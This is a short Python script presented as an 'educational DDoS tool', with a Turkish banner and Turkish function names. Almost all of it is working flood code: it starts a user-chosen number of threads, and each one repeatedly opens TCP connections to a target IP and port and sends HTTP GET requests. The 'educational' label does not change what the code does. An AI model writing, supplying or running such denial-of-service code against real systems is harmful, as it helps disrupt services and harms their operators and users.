import socket
import threading
import os
import time

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print("""
 __        __   _                            _ 
 \\ \\      / /__| | ___ ___  _ __ ___   ___  | |
  \\ \\ /\\ / / _ \\ |/ __/ _ \\| '_ ` _ \\ / _ \\ | |
   \\ V  V /  __/ | (_| (_) | | | | | |  __/ |_|
    \\_/\\_/ \\___|_|\\___\\___/|_| |_| |_|\\___| (_)
        Wokec-ddos | Eğitim Amaçlı DDoS Aracı
    """)
    time.sleep(1)

def saldir(hedef_ip, hedef_port, istek_sayisi):
    banner()

    def flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((hedef_ip, hedef_port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + hedef_ip.encode() + b"\r\n\r\n")
                s.close()
                print(">> İstek gönderildi.")
            except:
                print(">> Bağlantı hatası.")
                break

    for i in range(istek_sayisi):
        thread = threading.Thread(target=flood)
        thread.start()
